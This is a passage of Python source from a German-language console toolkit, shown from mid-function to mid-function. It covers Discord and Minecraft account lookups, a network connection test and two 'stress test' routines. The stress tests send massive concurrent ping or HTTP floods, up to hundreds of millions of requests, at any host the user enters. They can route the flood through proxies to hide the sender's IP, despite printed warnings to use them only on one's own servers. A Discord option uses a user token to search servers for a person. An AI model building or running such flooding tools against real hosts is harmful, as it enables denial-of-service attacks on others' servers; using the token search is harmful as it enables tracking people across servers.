    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    print(T)
    print(L(f"{YG}⬡ DISCORD USER PROFIL{R}"))
    print(M)
    print(L(f"{DG}Username       {R}{G}{'🤖 ' if bot else ''}{tag}{R}"))
    print(L(f"{DG}Display Name   {R}{G}{gname}{R}"))
    print(L(f"{DG}User-ID        {R}{YG}{uid}{R}"))
    print(L(f"{DG}Account seit   {R}{G}{created} UTC{R}"))
    print(L(f"{DG}Account-Alter  {R}{G}{age_str}{R}"))
    print(L(f"{DG}Avatar         {R}{G}{av_url[:58]}{R}"))
    if badges:
        print(M)
        print(L(f"{YG}Badges:{R}"))
        for b in badges:
            print(L(f"  {G}✦ {b}{R}"))
    if found_in:
        print(M)
        print(L(f"{YG}Gemeinsame Server ({len(found_in)}):{R}"))
        for s in found_in[:10]:
            nick_str = f"  Nick: {s['nick']}" if s['nick'] else ""
            print(L(f"  {G}{s['server'][:35]:<35}{R}{DG}{nick_str}{R}"))
            print(L(f"  {DG}Beitritt: {s['joined']}  Rollen: {s['roles']}{R}"))
    print(B)
    wait()

def discord_lookup():
    while True:
        hdr("DISCORD LOOKUP")
        print(f"  {DG} 1{R} {G}» Server Invite Lookup   {DG}(Name, Member, Boost, Features){R}")
        print(f"  {DG} 2{R} {G}» User ID Lookup         {DG}(Account-Alter, Badges, Avatar){R}")
        print(f"  {DG} 3{R} {G}» Guild Widget           {DG}(Online-Liste, Voice-Kanäle){R}")
        print(f"  {DG} 4{R} {G}» Username → User-ID     {DG}(User-Token, sucht alle Server){R}")
        print(f"  {DG} 0{R} {G}» Zurück{R}")
        print()
        m = input(f"  {G}>>{R} ").strip()
        if m == "0": break
        div()
        {"1":dc_invite_lookup,"2":dc_user_lookup,"3":dc_widget_lookup,"4":dc_username_to_id}.get(m, lambda: print(f"  {G}Ungültig{R}"))()
        if m not in ("1","2","3","4"): wait()

# ════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════
def mc_account_lookup():
    hdr("MINECRAFT ACCOUNT LOOKUP")
    username = inp("Minecraft Username")
    div()
    if not username:
        print(f"  {G}[!] Kein Username eingegeben.{R}"); wait(); return

    W = 62
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    # --- Ashcon API (UUID + Name-History + Skin) ---
    print(f"  {DG}Lade Profil ...{R}", end="", flush=True)
    ashcon = None
    try:
        ashcon = getj(f"https://api.ashcon.app/mojang/v2/user/{urllib.parse.quote(username)}")
    except urllib.error.HTTPError as e:
        print()
        if e.code == 404:
            print(f"\n  {G}[✗] Account '{username}' nicht gefunden.{R}")
        else:
            print(f"\n  {G}[!] Ashcon HTTP {e.code}{R}")
        wait(); return
    except Exception as e:
        print(f"\n  {G}[!] {e}{R}"); wait(); return

    print(f" {G}OK{R}")

    uuid_fmt  = ashcon.get("uuid", "")
    uuid_raw  = uuid_fmt.replace("-","")
    name_real = ashcon.get("username", username)

    # Name-History
    name_history = ashcon.get("username_history", [])  # [{username, changed_at}, ...]

    # Textures
    tex_block  = ashcon.get("textures", {})
    skin_url   = tex_block.get("skin", {}).get("url", "—") or "—"
    skin_model = tex_block.get("skin", {}).get("model", "classic") or "classic"
    skin_model = "slim (Alex)" if skin_model == "slim" else "classic (Steve)"
    cape_url   = tex_block.get("cape", {}).get("url", "—") if tex_block.get("cape") else "—"

    # --- Mojang Session-Server für Account-Typ ---
    legacy = False
    demo   = False
    created_ts = "?"
    try:
        full  = getj(f"https://sessionserver.mojang.com/session/minecraft/profile/{uuid_raw}")
        legacy = full.get("legacy", False)
        demo   = full.get("demo", False)
    except: pass

    # UUID v4 time estimate (nicht offiziell, nur UUID-Typ prüfen)
    uuid_version = "?"
    if len(uuid_raw) == 32:
        try: uuid_version = str(int(uuid_raw[12],16))
        except: pass

    # --- PlayerDB für zusätzliche Daten ---
    playerdb_badges = []
    try:
        pdb = getj(f"https://playerdb.co/api/player/minecraft/{urllib.parse.quote(username)}")
        pdata = pdb.get("data",{}).get("player",{})
    except: pdata = {}

    namemc_url  = f"https://namemc.com/profile/{uuid_fmt}"
    crafatar_av = f"https://crafatar.com/avatars/{uuid_raw}?size=64&overlay"
    crafatar_bd = f"https://crafatar.com/renders/body/{uuid_raw}?scale=6&overlay"
    crafatar_hd = f"https://crafatar.com/renders/head/{uuid_raw}?scale=10&overlay"
    skin_view   = f"https://namemc.com/skin/{uuid_raw}"

    print()
    print(T)
    print(L(f"{YG}⬡ MINECRAFT ACCOUNT  {DG}│  {G}{name_real}{R}"))
    print(M)
    print(L(f"{DG}Username       {R}{G}{name_real}{R}"))
    print(L(f"{DG}UUID           {R}{YG}{uuid_fmt}{R}"))
    print(L(f"{DG}UUID (raw)     {R}{DG}{uuid_raw}{R}"))
    print(L(f"{DG}UUID Version   {R}{DG}v{uuid_version}{R}"))
    print(M)
    # Account-Typ
    if demo:
        print(L(f"{YG}⚠ DEMO-Account (nicht gekauft){R}"))
    elif legacy:
        print(L(f"{YG}⚠ LEGACY-Account (nicht zu Microsoft migriert){R}"))
    else:
        print(L(f"{G}✔ Premium-Account (Microsoft verknüpft){R}"))
    print(M)
    print(L(f"{DG}Skin-Modell    {R}{G}{skin_model}{R}"))
    if skin_url != "—":
        print(L(f"{DG}Skin URL       {R}{G}{skin_url[:58]}{R}"))
    else:
        print(L(f"{DG}Skin           {R}{DG}Standard-Skin{R}"))
    if cape_url != "—":
        print(L(f"{DG}Cape           {R}{G}{cape_url[:58]}{R}"))
    else:
        print(L(f"{DG}Cape           {R}{DG}kein Cape{R}"))
    print(M)
    # Name-History
    if name_history:
        print(L(f"{YG}Name-Verlauf ({len(name_history)} Namen):{R}"))
        for i, entry in enumerate(name_history):
            n    = entry.get("username","?")
            when = (entry.get("changed_at") or "Original")[:10]
            mark = f"{G}◄ aktuell{R}" if n == name_real else f"{DG}{when}{R}"
            print(L(f"  {G}{i+1:>2}. {n:<24}{R} {mark}"))
    print(M)
    print(L(f"{DG}NameMC         {R}{G}{namemc_url}{R}"))
    print(L(f"{DG}Skin-Vorschau  {R}{G}{skin_view}{R}"))
    print(L(f"{DG}Avatar (PNG)   {R}{G}{crafatar_av}{R}"))
    print(L(f"{DG}Body-Render    {R}{G}{crafatar_bd}{R}"))
    print(L(f"{DG}Kopf-Render    {R}{G}{crafatar_hd}{R}"))
    print(B)
    wait()

def _mc_ping_once(host, port, timeout=5, proxy_host=None, proxy_port=1080):
    """Sendet einen einzelnen MC Status-Ping. Gibt (ms, online, players) zurück."""
    t0 = time.time()
    try:
        if proxy_host:
            try:
                import socks as _socks_mod
                s = _socks_mod.socksocket()
                s.set_proxy(_socks_mod.SOCKS5, proxy_host, proxy_port)
            except ImportError:
                s = socket.socket()
        else:
            s = socket.socket()
        s.settimeout(timeout); s.connect((host, port))
        hb  = host.encode()
        pkt = b"\x00" + _varint_w(47) + _varint_w(len(hb)) + hb + port.to_bytes(2,"big") + b"\x01"
        s.sendall(_varint_w(len(pkt)) + pkt + b"\x01\x00")
        _varint_r(s); _varint_r(s)
        jlen = _varint_r(s)
        data = b""
        while len(data) < jlen:
            c = s.recv(min(4096, jlen-len(data)))
            if not c: break
            data += c
        s.close()
        ms = (time.time()-t0)*1000
        d  = json.loads(data.decode())
        pl = d.get("players",{})
        return ms, True, pl.get("online",0), pl.get("max",0)
    except:
        return (time.time()-t0)*1000, False, 0, 0

def _parse_duration_or_count(raw, default_count=100, max_count=10000):
    """
    Parst '30s', '1m', '2m30s' als Sekunden-Dauer ODER eine Zahl als Anzahl.
    Gibt (count_or_None, duration_secs_or_None) zurück.
    """
    raw = raw.strip().lower()
    if not raw:
        return default_count, None
    # Zeitformat: z.B. 1m, 30s, 2m30s, 90s
    m = re.match(r'^(?:(\d+)m)?(?:(\d+)s)?$', raw)
    if m and (m.group(1) or m.group(2)):
        mins = int(m.group(1) or 0)
        secs = int(m.group(2) or 0)
        total = mins*60 + secs
        if total > 0:
            return None, min(total, 3600)
    # Zahl
    try:
        n = int(raw)
        return max(1, min(n, max_count)), None
    except:
        return default_count, None

def net_stress_test():
    import threading
    hdr("INTERNET VERBINDUNGS-TEST")
    print(f"  {DG}Testet Verbindung zu einer IP — Latenz, Speed, Stabilität.{R}")
    print(f"  {DG}Leer lassen = eigene Internetverbindung testen.{R}\n")

    custom_ip = input(f"  {G}>{R} Ziel-IP / Domain (leer = eigene Verbindung): ").strip()
    div()

    W = 62
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    # ── Einstellungen ────────────────────────────────────────────
    print(f"  {DG}Dauer/Anzahl: z.B. '30s', '1m', '2m30s' oder Zahl wie '100'{R}\n")
    try:
        raw_pings    = input(f"  {G}>{R} Pings (Anzahl/Dauer)  [Standard: 20]:  ").strip()
        n_pings_cfg, ping_duration = _parse_duration_or_count(raw_pings, 20, 5000)
        n_parallel   = int(input(f"  {G}>{R} Parallele Verbind.   [Standard: 50]:  ").strip() or "50")
        ping_timeout = int(input(f"  {G}>{R} Timeout (Sek.)        [Standard: 2]:   ").strip() or "2")
        do_speedtest = input(f"  {G}>{R} Download/Upload testen? [J/n]: ").strip().lower()
        do_speed     = do_speedtest not in ("n","nein","no")
    except ValueError:
        print(f"  {G}[!] Ungültige Eingabe.{R}"); wait(); return

    if ping_duration:
        n_pings_cfg = 99999  # läuft bis Timeout
    n_parallel  = max(1, min(n_parallel, 500))
    ping_timeout= max(1, min(ping_timeout, 15))
    div()

    # Ziel-IP auflösen
    target_ip   = None
    target_name = None
    if custom_ip:
        try:
            target_ip   = socket.gethostbyname(custom_ip)
            target_name = custom_ip
            print(f"  {DG}Ziel: {G}{custom_ip}{DG} → {G}{target_ip}{R}")
        except:
            print(f"  {G}[!] Host nicht auflösbar.{R}"); wait(); return

    print(f"  {DG}Pings:       {G}{n_pings_cfg}{R}")
    print(f"  {DG}Parallel:    {G}{n_parallel}{R}")
    print(f"  {DG}Timeout:     {G}{ping_timeout}s{R}")
    print(f"  {DG}Speed-Test:  {G}{'Ja' if do_speed else 'Nein'}{R}\n")

    # ── Schritt 1: IP-Info ───────────────────────────────────────
    print(f"  {DG}[ 1/5 ] IP-Info ermitteln ...{R}", end="", flush=True)
    my_ip = "?"
    isp   = "?"
    city  = "?"
    country = "?"
    try:
        lookup_ip = target_ip if target_ip else ""
        geo     = getj(f"http://ip-api.com/json/{lookup_ip}?fields=query,isp,city,country,org")
        my_ip   = geo.get("query","?")
        isp     = geo.get("isp","?") or geo.get("org","?")
        city    = geo.get("city","?")
        country = geo.get("country","?")
    except: pass
    print(f" {G}OK{R}")

    # ── Schritt 2: Latenz ────────────────────────────────────────
    print(f"  {DG}[ 2/5 ] Latenz-Test ({n_pings_cfg} Pings) ...{R}", end="", flush=True)
    if target_ip:
        # Ziel-IP auf mehreren Ports testen
        ping_targets = [
            (target_name or target_ip, target_ip),
        ]
        # Zusätzlich Referenz-Ping damit man vergleichen kann
        ping_targets += [("Cloudflare (Ref.)", "1.1.1.1")]
    else:
        ping_targets = [
            ("Cloudflare", "1.1.1.1"),
            ("Google",     "8.8.8.8"),
            ("Quad9",      "9.9.9.9"),
        ]
    # Welche Ports für Ping-Check — bei custom IP mehrere probieren
    def _tcp_ping(ip, port=53, timeout=ping_timeout):
        t0 = time.time()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            s.close()
            return (time.time()-t0)*1000
        except: return None

    def _best_ping(ip):
        """Probiert mehrere Ports und nimmt den schnellsten."""
        for port in [80, 443, 53, 22, 25565, 8080]:
            r = _tcp_ping(ip, port)
            if r is not None:
                return r, port
        return None, None

    ping_results = {}
    for name, ip in ping_targets:
        times = []
        _, best_port = _best_ping(ip)
        port = best_port or 80
        deadline = time.time() + ping_duration if ping_duration else None
        i = 0
        while True:
            if deadline:
                if time.time() >= deadline: break
                remain = int(deadline - time.time())
                print(f"\r  {DG}[ 2/5 ] {name:<16} {G}{len(times)}p{R}  {DG}{remain}s verbleibend  {R}", end="", flush=True)
            else:
                if i >= n_pings_cfg: break
                i += 1
            t0 = time.time()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(ping_timeout)
                s.connect((ip, port))
                s.close()
                times.append((time.time()-t0)*1000)
            except: times.append(None)
        valid = [t for t in times if t is not None]
        lost  = times.count(None)
        ping_results[name] = {
            "avg":  sum(valid)/len(valid) if valid else 9999,
            "min":  min(valid) if valid else 9999,
            "max":  max(valid) if valid else 9999,
            "loss": lost,
            "n":    n_pings_cfg,
        }
    print(f" {G}OK{R}")

    # ── Schritt 3: Download-Speed ────────────────────────────────
    dl_results = []
    ul_mbps    = 0
    if do_speed:
        print(f"  {DG}[ 3/5 ] Download-Speed ...{R}", end="", flush=True)
        dl_urls = [
            ("1 MB",  "https://speed.cloudflare.com/__down?bytes=1000000"),
            ("10 MB", "https://speed.cloudflare.com/__down?bytes=10000000"),
            ("25 MB", "https://speed.cloudflare.com/__down?bytes=25000000"),
        ]
        for label, url in dl_urls:
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                t0  = time.time()
                with urllib.request.urlopen(req, timeout=30) as r:
                    data = r.read()
                dt   = time.time()-t0
                mbps = (len(data)*8/1_000_000)/dt
                dl_results.append((label, mbps, dt))
            except: dl_results.append((label, 0, 0))
        print(f" {G}OK{R}")

        # ── Schritt 4: Upload-Speed ──────────────────────────────
        print(f"  {DG}[ 4/5 ] Upload-Speed ...{R}", end="", flush=True)
        try:
            payload = b"X" * 2_000_000
            req = urllib.request.Request(
                "https://speed.cloudflare.com/__up",
                data=payload, method="POST",
                headers={"User-Agent":"Mozilla/5.0","Content-Length":str(len(payload))}
            )
            t0 = time.time()
            urllib.request.urlopen(req, timeout=30)
            ul_mbps = (len(payload)*8/1_000_000)/(time.time()-t0)
        except: pass
        print(f" {G}OK{R}")
    else:
        print(f"  {DG}[ 3/5 ] Download übersprungen{R}")
        print(f"  {DG}[ 4/5 ] Upload übersprungen{R}")

    # ── Schritt 5: Verbindungsstabilität (parallel) ─────────────
    print(f"  {DG}[ 5/5 ] Stabilität ({n_parallel} parallele Verbindungen) ...{R}", end="", flush=True)
    stab_results = []
    stab_lock    = threading.Lock()
    stab_ip      = target_ip if target_ip else "1.1.1.1"
    _, stab_port = _best_ping(stab_ip)
    stab_port    = stab_port or 80

    def stab_worker():
        ms = _tcp_ping(stab_ip, stab_port, timeout=ping_timeout)
        with stab_lock:
            stab_results.append(ms)
    stab_threads = [threading.Thread(target=stab_worker, daemon=True) for _ in range(n_parallel)]
    for t in stab_threads: t.start()
    for t in stab_threads: t.join()
    stab_ok   = [r for r in stab_results if r is not None]
    stab_fail = stab_results.count(None)
    stab_avg  = sum(stab_ok)/len(stab_ok) if stab_ok else 9999
    print(f" {G}OK{R}")

    # ── Ausgabe ──────────────────────────────────────────────────
    print()
    print(T)
    title = f"VERBINDUNGS-TEST → {target_name or target_ip}" if target_ip else "INTERNET VERBINDUNGS-TEST"
    print(L(f"{YG}⬡ {title}{R}"))
    print(M)
    ip_label = "Ziel-IP" if target_ip else "Deine IP"
    print(L(f"{DG}{ip_label:<14}{R}{YG}{my_ip}{R}"))
    print(L(f"{DG}ISP            {R}{G}{isp}{R}"))
    print(L(f"{DG}Standort       {R}{G}{city}, {country}{R}"))
    if target_ip:
        print(L(f"{DG}Eigene IP      {R}{DG}(Download/Upload via Cloudflare gemessen){R}"))
    print(M)
    print(L(f"{YG}── Latenz (TCP-Ping × 15) ──{R}"))
    for name, pr in ping_results.items():
        n_total = pr.get("n", 10)
        bar_ms = min(int(pr['avg']/5), 20)
        bar    = f"{G}{'▪'*bar_ms}{DG}{'·'*(20-bar_ms)}{R}"
        loss_str = f"  {YG}⚠ {pr['loss']}/{n_total} verloren{R}" if pr['loss'] else ""
        is_target = target_ip and name == (target_name or target_ip)
        col = YG if is_target else DG
        print(L(f"  {col}{name:<16}{R} {bar} {G}{pr['avg']:.1f}ms{R}{loss_str}"))
        print(L(f"  {DG}{'':16} Min:{pr['min']:.0f}ms  Max:{pr['max']:.0f}ms  Jitter:{pr['max']-pr['min']:.0f}ms{R}"))
    print(M)
    print(L(f"{YG}── Download-Speed ──{R}"))
    best_dl = max((r[1] for r in dl_results), default=0)
    for label, mbps, dt in dl_results:
        if mbps == 0:
            print(L(f"  {DG}{label:<8}{R} {G}Fehler{R}"))
            continue
        bar_w  = min(int(mbps/5), 25)
        bar    = f"{G}{'█'*bar_w}{DG}{'░'*(25-bar_w)}{R}"
        print(L(f"  {DG}{label:<8}{R} {bar} {G}{mbps:.1f} Mbit/s{R}  {DG}({dt:.1f}s){R}"))
    print(M)
    print(L(f"{YG}── Upload-Speed ──{R}"))
    if ul_mbps > 0:
        bar_w = min(int(ul_mbps/5), 25)
        bar   = f"{G}{'█'*bar_w}{DG}{'░'*(25-bar_w)}{R}"
        print(L(f"  {DG}2 MB Upload {R}{bar} {G}{ul_mbps:.1f} Mbit/s{R}"))
    else:
        print(L(f"  {DG}Upload-Test nicht verfügbar{R}"))
    print(M)
    print(L(f"{YG}── Stabilität (50 parallele Verbindungen) ──{R}"))
    stab_pct = len(stab_ok)/n_parallel*100 if n_parallel else 0
    bar_w    = int(stab_pct/4)
    bar      = f"{G}{'█'*bar_w}{DG}{'░'*(25-bar_w)}{R}"
    print(L(f"  {bar} {G}{stab_pct:.0f}% erfolgreich{R}"))
    print(L(f"  {DG}Ø Latenz unter Last: {R}{G}{stab_avg:.0f}ms{R}  {DG}Fehler: {stab_fail}/{n_parallel}{R}"))
    if do_speed:
        print(M)
        print(L(f"{YG}── Download-Speed ──{R}"))
        best_dl = max((r[1] for r in dl_results), default=0)
        for label, mbps, dt in dl_results:
            if mbps == 0:
                print(L(f"  {DG}{label:<8}{R} {G}Fehler / Timeout{R}"))
                continue
            bar_w = min(int(mbps/5), 25)
            bar   = f"{G}{'█'*bar_w}{DG}{'░'*(25-bar_w)}{R}"
            print(L(f"  {DG}{label:<8}{R} {bar} {G}{mbps:.1f} Mbit/s{R}  {DG}({dt:.1f}s){R}"))
        print(M)
        print(L(f"{YG}── Upload-Speed ──{R}"))
        if ul_mbps > 0:
            bar_w = min(int(ul_mbps/5), 25)
            bar   = f"{G}{'█'*bar_w}{DG}{'░'*(25-bar_w)}{R}"
            print(L(f"  {DG}2 MB Upload {R}{bar} {G}{ul_mbps:.1f} Mbit/s{R}"))
        else:
            print(L(f"  {DG}Upload-Test fehlgeschlagen{R}"))
    else:
        best_dl = 0

    print(M)
    # Gesamtbewertung
    avg_ping = sum(r["avg"] for r in ping_results.values())/len(ping_results)
    fail_pct = stab_fail/n_parallel*100 if n_parallel else 0
    if do_speed:
        if best_dl >= 100 and avg_ping < 20 and fail_pct < 5:
            bewertung = f"{G}★★★★★ AUSGEZEICHNET{R}"
        elif best_dl >= 50 and avg_ping < 50 and fail_pct < 10:
            bewertung = f"{G}★★★★☆ SEHR GUT{R}"
        elif best_dl >= 25 and avg_ping < 100:
            bewertung = f"{G}★★★☆☆ GUT{R}"
        elif best_dl >= 10:
            bewertung = f"{YG}★★☆☆☆ MITTEL{R}"
        else:
            bewertung = f"{G}★☆☆☆☆ SCHWACH{R}"
    else:
        if avg_ping < 10 and fail_pct < 2:
            bewertung = f"{G}★★★★★ AUSGEZEICHNET{R}"
        elif avg_ping < 30 and fail_pct < 5:
            bewertung = f"{G}★★★★☆ SEHR GUT{R}"
        elif avg_ping < 80 and fail_pct < 10:
            bewertung = f"{G}★★★☆☆ GUT{R}"
        elif avg_ping < 200:
            bewertung = f"{YG}★★☆☆☆ MITTEL{R}"
        else:
            bewertung = f"{G}★☆☆☆☆ SCHLECHT{R}"
    print(L(f"{YG}Gesamtbewertung: {R}{bewertung}"))
    print(B)
    wait()

def mc_stress_test():
    import threading
    # Windows Socket-Limit erhöhen
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except Exception:
        pass
    threading.stack_size(65536)
    hdr("MINECRAFT SERVER STRESS-TEST")
    print(f"  {R}⚠  NUR für deinen eigenen Minecraft-Server!{R}")
    print(f"  {DG}Sendet viele Status-Pings gleichzeitig um die Server-Last zu testen.{R}\n")
    host = inp("Server-IP / Domain").strip()
    if not host: wait(); return
    print(f"  {DG}Dauer/Anzahl: z.B. '30s', '1m', '2m30s' oder Zahl wie '500'{R}")
    try:
        port    = int(input(f"  {G}>{R} Port                  [Standard: 25565]: ").strip() or "25565")
        raw_p   = input(f"  {G}>{R} Anzahl/Dauer Pings    [Standard: 200]:   ").strip()
        pings, mc_duration = _parse_duration_or_count(raw_p, 200, 999_999_999)
        threads = int(input(f"  {G}>{R} Gleichzeitige Threads [Standard: 20]:    ").strip() or "20")
        timeout = int(input(f"  {G}>{R} Timeout (Sek.)        [Standard: 5]:     ").strip() or "5")
    except ValueError:
        print(f"  {G}[!] Ungültige Eingabe.{R}"); wait(); return
    print(f"  {DG}SOCKS5-Proxy (leer = keine): z.B. 127.0.0.1:1080{R}")
    mc_proxy_raw = input(f"  {G}>{R} SOCKS5-Proxy           [leer = eigene IP]: ").strip()
    mc_proxy_host, mc_proxy_port_num = None, 1080
    if mc_proxy_raw:
        try:
            import socks as _socks_mod
            _ph, _pp = (mc_proxy_raw.replace("socks5://","").split(":",1) + ["1080"])[:2]
            mc_proxy_host, mc_proxy_port_num = _ph.strip(), int(_pp.strip())
        except ImportError:
            print(f"  {YG}[!] PySocks nicht installiert: pip install PySocks{R}")
            mc_proxy_host = None

    pings   = max(1, pings)
    threads = max(1, threads)
    timeout = max(1, timeout)

    # DNS auflösen
    try:
        ip = socket.gethostbyname(host)
    except:
        print(f"  {G}[!] Host nicht auflösbar.{R}"); wait(); return

    div()
    dur_str = f"{mc_duration}s" if mc_duration else f"{pings} Pings"
    print(f"  {DG}Ziel:        {G}{host} ({ip}:{port}){R}")
    print(f"  {DG}Test:        {G}{dur_str}{R}")
    print(f"  {DG}Threads:     {G}{threads}{R}")
    print(f"  {DG}Timeout:     {G}{timeout}s{R}")
    print(f"  {DG}Proxy:       {G}{mc_proxy_raw if mc_proxy_raw and mc_proxy_host else 'keiner (eigene IP)'}{R}\n")

    results  = []
    lock     = threading.Lock()
    sem      = threading.Semaphore(threads)
    start    = time.time()
    deadline = start + mc_duration if mc_duration else None

    def worker():
        with sem:
            ms, ok, online, maxp = _mc_ping_once(host, port, timeout, mc_proxy_host, mc_proxy_port_num)
            with lock:
                results.append((ms, ok, online, maxp))

    all_t = []
    i = 0
    while True:
        if deadline:
            if time.time() >= deadline: break
            remain    = int(deadline - time.time())
            elapsed   = int(time.time()-start)
            bar_fill  = min(30, int(30 * elapsed / mc_duration))
            ok_so_far = sum(1 for r in results if r[1])
            bar = f"{G}{'█'*bar_fill}{DG}{'░'*(30-bar_fill)}{R}"
            print(f"\r  {bar} {G}{remain}s{R}  {DG}Pings: {len(results)}  OK: {ok_so_far}{R}", end="", flush=True)
        else:
            if i >= pings: break
            filled    = int(30*(i+1)/pings)
            ok_so_far = sum(1 for r in results if r[1])
            bar = f"{G}{'█'*filled}{DG}{'░'*(30-filled)}{R}"
            print(f"\r  {bar} {G}{i+1}/{pings}{R}  {DG}OK: {ok_so_far}{R}", end="", flush=True)
        t = threading.Thread(target=worker, daemon=True)
        all_t.append(t); t.start()
        i += 1

    for t in all_t: t.join()
    total_time = time.time() - start
    total_pings = len(results)
    print(f"\r  {G}{'█'*30}{R} {G}Fertig! {total_pings} Pings in {total_time:.1f}s{R}          \n")

    ok_r    = [r for r in results if r[1]]
    fail_r  = [r for r in results if not r[1]]
    times   = [r[0] for r in ok_r]
    avg_ms  = sum(times)/len(times)  if times else 0
    min_ms  = min(times)             if times else 0
    max_ms  = max(times)             if times else 0
    med_ms  = sorted(times)[len(times)//2] if times else 0
    p95_ms  = sorted(times)[int(len(times)*0.95)] if times else 0
    pps     = pings / total_time if total_time else 0
    success = len(ok_r)/total_pings*100 if total_pings else 0

    players_seen = [r[2] for r in ok_r if r[2] is not None]
    maxp_seen    = ok_r[-1][3] if ok_r else 0
    avg_online   = sum(players_seen)/len(players_seen) if players_seen else 0

    if avg_ms < 20:    rating = f"{G}AUSGEZEICHNET (lokaler Server){R}"
    elif avg_ms < 80:  rating = f"{G}SEHR GUT{R}"
    elif avg_ms < 200: rating = f"{G}GUT{R}"
    elif avg_ms < 500: rating = f"{YG}MITTEL{R}"
    else:              rating = f"{G}LANGSAM / ÜBERLASTET{R}"

    W = 62
    T = f"  {DG}╔{'═'*W}╗{R}"
    B = f"  {DG}╚{'═'*W}╝{R}"
    M = f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    print(T)
    print(L(f"{YG}⬡ MC STRESS-TEST  {DG}│  {G}{host}:{port}{R}"))
    print(M)
    print(L(f"{DG}Pings gesamt    {R}{G}{pings}{R}"))
    print(L(f"{DG}Erfolgreich     {R}{G}{len(ok_r)}  ({success:.1f}%){R}"))
    print(L(f"{DG}Fehlgeschlagen  {R}{G}{len(fail_r)}{R}"))
    print(L(f"{DG}Gesamtzeit      {R}{G}{total_time:.2f}s{R}"))
    print(L(f"{DG}Pings/Sekunde   {R}{YG}{pps:.1f}{R}"))
    print(M)
    print(L(f"{YG}── Ping-Zeiten ──{R}"))
    print(L(f"{DG}Durchschnitt    {R}{G}{avg_ms:.1f} ms{R}  {rating}"))
    print(L(f"{DG}Minimum         {R}{G}{min_ms:.1f} ms{R}"))
    print(L(f"{DG}Maximum         {R}{G}{max_ms:.1f} ms{R}"))
    print(L(f"{DG}Median          {R}{G}{med_ms:.1f} ms{R}"))
    print(L(f"{DG}95. Perzentil   {R}{G}{p95_ms:.1f} ms{R}"))
    print(M)
    print(L(f"{YG}── Server-Info (aus Pings) ──{R}"))
    print(L(f"{DG}Spieler (Ø)     {R}{G}{avg_online:.1f} / {maxp_seen}{R}"))
    if len(fail_r) > len(ok_r)*0.3:
        print(M)
        print(L(f"{YG}⚠ Viele Fehler — Server könnte überlastet sein oder{R}"))
        print(L(f"{YG}  Rate-Limiting / Anti-Bot-Schutz aktiv sein.{R}"))
    print(B)
    wait()

def stress_test():
    import threading
    hdr("SERVER STRESS-TEST")
    print(f"  {R}⚠  NUR für eigene Server / Server mit ausdrücklicher Erlaubnis!{R}")
    print(f"  {DG}Unerlaubte Angriffe auf fremde Server sind strafbar (§303b StGB).{R}\n")
    target = inp("Ziel-URL (z.B. http://localhost oder http://meinserver.de)").strip()
    if not target:
        wait(); return
    if not target.startswith("http"):
        target = "http://" + target

    raw_r   = input(f"  {G}>{R} Requests / Dauer [Standard: 100 | z.B. 1m, 30s]: ").strip()
    reqs, http_dur = _parse_duration_or_count(raw_r, default_count=100, max_count=10000)
    try:
        threads = int(input(f"  {G}>{R} Gleichzeitig     [Standard: 10]:  ").strip() or "10")
        timeout = int(input(f"  {G}>{R} Timeout (Sek.)   [Standard: 5]:   ").strip() or "5")
    except ValueError:
        print(f"  {G}[!] Ungültige Eingabe.{R}"); wait(); return
    print(f"  {DG}Proxy (leer = keine): z.B. http://1.2.3.4:8080 oder socks5://1.2.3.4:1080{R}")
    proxy_raw = input(f"  {G}>{R} Proxy-URL           [leer = deine echte IP]: ").strip()
    proxy_handler = None
    if proxy_raw:
        proxy_handler = urllib.request.ProxyHandler({"http": proxy_raw, "https": proxy_raw})

    threads = max(1, threads)
    timeout = max(1, timeout)

    dur_str = f"{http_dur}s" if http_dur else f"{reqs} Requests"
    div()
    print(f"  {DG}Ziel:       {G}{target}{R}")
    print(f"  {DG}Test:       {G}{dur_str}{R}")
    print(f"  {DG}Threads:    {G}{threads}{R}")
    print(f"  {DG}Timeout:    {G}{timeout}s{R}")
    print(f"  {DG}Proxy:      {G}{proxy_raw if proxy_raw else 'keiner (eigene IP)'}{R}\n")
    print(f"  {DG}Starte Test ...{R}\n")

    results   = []
    errors    = []
    lock      = threading.Lock()
    start_all = time.time()
    deadline  = start_all + http_dur if http_dur else None

    def worker():
        req = urllib.request.Request(target, headers={"User-Agent":"StressTest/1.0"})
        t0  = time.time()
        try:
            if proxy_handler:
                opener = urllib.request.build_opener(proxy_handler)
                ctx_open = opener.open
            else:
                ctx_open = urllib.request.urlopen
            with ctx_open(req, timeout=timeout) as r:
                status = r.status
                size   = len(r.read())
            ms = (time.time() - t0) * 1000
            with lock:
                results.append((ms, status, size))
        except urllib.error.HTTPError as e:
            ms = (time.time() - t0) * 1000
            with lock:
                results.append((ms, e.code, 0))
        except Exception as e2:
            with lock:
                errors.append(str(e2))

    sem = threading.Semaphore(threads)

    def throttled():
        with sem:
            worker()

    all_threads = []
    i = 0
    while True:
        if deadline:
            if time.time() >= deadline: break
            remain  = int(deadline - time.time())
            elapsed = int(time.time() - start_all)
            bar_fill = int(30 * elapsed / http_dur) if http_dur else 0
            bar = f"{G}{'█'*bar_fill}{DG}{'░'*(30-bar_fill)}{R}"
            print(f"\r  {bar} {G}{remain}s{R}  {DG}Req: {len(results)+len(errors)}  Fehler: {len(errors)}{R}", end="", flush=True)
        else:
            if i >= reqs: break
            filled = int(30*(i+1)/reqs)
            bar = f"{G}{'█'*filled}{DG}{'░'*(30-filled)}{R}"
            print(f"\r  {bar} {G}{i+1}/{reqs}{R}  {DG}({len(errors)} Fehler){R}", end="", flush=True)
        t = threading.Thread(target=throttled, daemon=True)
        all_threads.append(t)
        t.start()
        while threading.active_count() > threads + 5:
            time.sleep(0.01)
